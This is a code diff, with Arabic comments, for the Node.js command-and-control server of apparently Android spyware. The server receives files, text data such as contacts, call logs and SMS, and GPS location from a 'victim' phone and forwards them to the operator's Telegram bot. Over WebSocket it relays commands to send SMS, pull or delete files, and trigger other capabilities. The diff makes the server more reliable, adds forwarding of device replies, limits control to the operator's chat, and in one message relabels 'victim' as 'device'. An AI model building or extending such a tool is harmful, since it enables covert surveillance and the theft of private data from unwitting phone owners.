@@ -32,30 +32,43 @@ app.get('/', (req, res) => {
 
 // مسار استقبال الملفات المرفوعة من هاتف الضحية (مثل التسجيلات الصوتية، الصور، الملفات)
 app.post('/sendFile', upload.single('file'), (req, res) => {
-    const filename = req.file.originalname;
-    
-    // إرسال الملف المستلم كوثيقة إلى البوت في تليجرام
-    bot.sendDocument(chatId, req.file.buffer, {}, { filename: filename, contentType: 'application/txt' })
-        .then(() => {
-            console.log(`تم بنجاح إرسال الملف: ${filename}`);
-        })
-        .catch((err) => {
-            console.log('حدث خطأ أثناء إرسال الملف:', err);
+    try {
+        const filename = req.file.originalname;
+        bot.sendDocument(chatId, req.file.buffer, {
+            caption: `📥 ملف مستلم من الجهاز`,
+            parse_mode: 'HTML'
+        }, { 
+            filename: filename, 
+            contentType: req.file.mimetype || 'application/octet-stream' 
         });
-        
-    res.send(filename);
+        console.log(`تم بنجاح إرسال الملف: ${filename}`);
+        res.send('تم الاستلام');
+    } catch (err) {
+        console.log('حدث خطأ أثناء إرسال الملف:', err);
+        res.status(500).send('خطأ');
+    }
 });
 
 // مسار استقبال النصوص (مثل جهات الاتصال، سجل المكالمات، الرسائل النصية)
 app.post('/sendText', (req, res) => {
-    bot.sendMessage(chatId, req.body.data, { parse_mode: 'HTML' });
-    res.send(req.body.data);
+    try {
+        bot.sendMessage(chatId, req.body.data, { parse_mode: 'HTML' });
+        res.send('تم الاستلام');
+    } catch (err) {
+        console.log('خطأ في استقبال النص:', err);
+        res.status(500).send('خطأ');
+    }
 });
 
 // مسار استقبال الموقع الجغرافي للضحية (GPS)
 app.post('/sendLocation', (req, res) => {
-    bot.sendLocation(chatId, req.body.l1, req.body.l2);
-    res.send(req.body.l1.toString());
+    try {
+        bot.sendLocation(chatId, req.body.l1, req.body.l2);
+        res.send('تم الاستلام');
+    } catch (err) {
+        console.log('خطأ في استقبال الموقع:', err);
+        res.status(500).send('خطأ');
+    }
 });
 
 // تشغيل خادم الاستماع (HTTP Server) على منفذ مخصص أو المنفذ الافتراضي 8999
@@ -74,21 +87,39 @@ wss.on('connection', (ws, req) => {
     const cleanIp = rawIp.replaceAll('f', '').replaceAll(':', '');
     
     // إرسال إشعار فوري لمخترق عبر تليجرام عند اتصال ضحية جديدة
-    const notificationMsg = `<b>📱 تم اتصال ضحية جديدة بالشبكة\n\nالمعرف الفريد (ID) = <code>${ws.uuid}</code>\nعنوان الـ IP = ${cleanIp}</b> 🌐`;
+    const notificationMsg = `<b>📱 تم اتصال جهاز جديد بالشبكة\n\nالمعرف الفريد (ID) = <code>${ws.uuid}</code>\nعنوان الـ IP = ${cleanIp}</b> 🌐`;
     bot.sendMessage(chatId, notificationMsg, { parse_mode: 'HTML' });
+
+    // ✅ إضافة استقبال ردود الجهاز وإرسالها مباشرة للبوت
+    ws.on('message', (message) => {
+        try {
+            const response = message.toString();
+            bot.sendMessage(chatId, `📤 رد من الجهاز <code>${ws.uuid}</code>:\n\n${response}`, { parse_mode: 'HTML' });
+        } catch (err) {
+            console.log('خطأ في استقبال رسالة السوكت:', err);
+        }
+    });
+
+    // إشعار عند قطع الاتصال
+    ws.on('close', () => {
+        bot.sendMessage(chatId, `<b>❌ تم قطع اتصال الجهاز\nالمعرف: <code>${ws.uuid}</code></b>`, { parse_mode: 'HTML' });
+    });
 });
 
 // وظيفة دورية كل ثانيتين لإرسال نبضة "be alive" لجميع الأجهزة للحفاظ على بقائها نشطة
 setInterval(() => {
     wss.clients.forEach((ws) => {
-        ws.send('be alive');
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send('be alive');
+        }
     });
 }, 2000);
 
 // ----------------- إدارة أوامر تليجرام (Telegram Commands) -----------------
 
 bot.on('message', (msg) => {
-    // التأكد من أن الرسالة نصية
+    // التأكد من أن الرسالة من المدير فقط
+    if (msg.chat.id != chatId) return;
     if (!msg.text) return;
 
     // عند إرسال أمر البدء /start
@@ -176,12 +207,12 @@ bot.on('message', (msg) => {
         
         // إذا كان الرد على رسالة "إرسال SMS"
         if (replyText.split('&')[0] === 'ss') {
-            const targetUuid = replyText.split('!')[0].split('[')[1]; // استخراج الـ UUID للضحية
-            const smsCommand = msg.text; // نص الأمر المكتوب بصيغة JSON
+            const targetUuid = replyText.split('&')[1].split('!')[0];
+            const smsCommand = msg.text;
             
             wss.clients.forEach((ws) => {
-                if (ws.uuid === targetUuid) {
-                    ws.send(`ss&${smsCommand}`); // إرسال الأمر للجهاز المتصل عبر الـ WebSocket
+                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
+                    ws.send(`ss&${smsCommand}`);
                 }
             });
             
@@ -190,20 +221,21 @@ bot.on('message', (msg) => {
                     keyboard: [
                         ['حالة الاتصال ⚙'],
                         ['لوحة التحكم ☄']
-                    ]
+                    ],
+                    resize_keyboard: true
                 }
             });
         }
 
         // إذا كان الرد على رسالة سحب ملف (gf) أو حذف ملف (df)
         if (replyText.split('&')[0] === 'df' || replyText.split('&')[0] === 'gf') {
-            const commandType = replyText.split('!')[0].split('&')[0]; // نوع الأمر (gf أو df)
-            const targetUuid = replyText.split('!')[0].split('&')[1]; // استخراج الـ UUID
-            const filePath = msg.text; // مسار الملف المطلوب
+            const commandType = replyText.split('&')[0];
+            const targetUuid = replyText.split('&')[1].split('!')[0];
+            const filePath = msg.text;
             
             wss.clients.forEach((ws) => {
-                if (ws.uuid === targetUuid) {
-                    ws.send(`${commandType}&${filePath}`); // إرسال الأمر للجهاز المتصل
+                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
+                    ws.send(`${commandType}&${filePath}`);
                 }
             });
             
@@ -212,7 +244,8 @@ bot.on('message', (msg) => {
                     keyboard: [
                         ['حالة الاتصال ⚙'],
                         ['لوحة التحكم ☄']
-                    ]
+                    ],
+                    resize_keyboard: true
                 }
             });
         }
@@ -222,14 +255,11 @@ bot.on('message', (msg) => {
 // ----------------- معالجة الضغط على أزرار لوحة التحكم التفاعلية -----------------
 
 bot.on('callback_query', function onCallbackQuery(callbackQuery) {
-    const action = callbackQuery.data; // الكود المختصر للأمر (مثال: cl, gc, ss...)
-    
-    // استخراج الـ UUID الخاص بالجهاز المستهدف من نص الرسالة التي تحتوي على الأزرار
+    const action = callbackQuery.data;
     const targetUuid = callbackQuery.message.text.split('&')[1];
 
     wss.clients.forEach((ws) => {
-        if (ws.uuid === targetUuid) {
-            // إذا كان الإجراء هو إرسال رسالة SMS
+        if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
             if (action === 'ss') {
                 const promptMsg = `ss&${ws.uuid}!\n\n<b>إجراء إرسال رسالة نصية (SMS)\n🔵 يرجى الرد على هذه الرسالة بكتابة الرقم والرسالة بالصيغة البرمجية التالية:</b>\n<code>[{"number":"رقم الهاتف هنا","message":"نص الرسالة هنا"}]</code>`;
                 bot.sendMessage(chatId, promptMsg, {
@@ -237,7 +267,6 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
                     parse_mode: 'HTML'
                 });
             } 
-            // إذا كان الإجراء هو سحب ملف أو مجلد
             else if (action === 'gf') {
                 const promptMsg = `gf&${ws.uuid}!\n\n<b>إجراء جلب ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المطلوب:</b>`;
                 bot.sendMessage(chatId, promptMsg, {
@@ -245,7 +274,6 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
                     parse_mode: 'HTML'
                 });
             } 
-            // إذا كان الإجراء هو حذف ملف أو مجلد
             else if (action === 'df') {
                 const promptMsg = `df&${ws.uuid}!\n\n<b>إجراء حذف ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المراد حذفه:</b>`;
                 bot.sendMessage(chatId, promptMsg, {
@@ -253,12 +281,12 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
                     parse_mode: 'HTML'
                 });
             } 
-            // لباقي الأوامر المباشرة (مثل تشغيل الكاميرا، الميكروفون، جلب جهات الاتصال)
             else {
-                ws.send(action); // إرسال الأمر مباشرة للهاتف عبر الـ WebSocket
+                ws.send(action);
             }
         }
     });
+    bot.answerCallbackQuery(callbackQuery.id);
 });
 
 // وظيفة لإبقاء السيرفر نشطاً (تجنباً لإغلاقه التلقائي من خدمات الاستضافة المجانية)
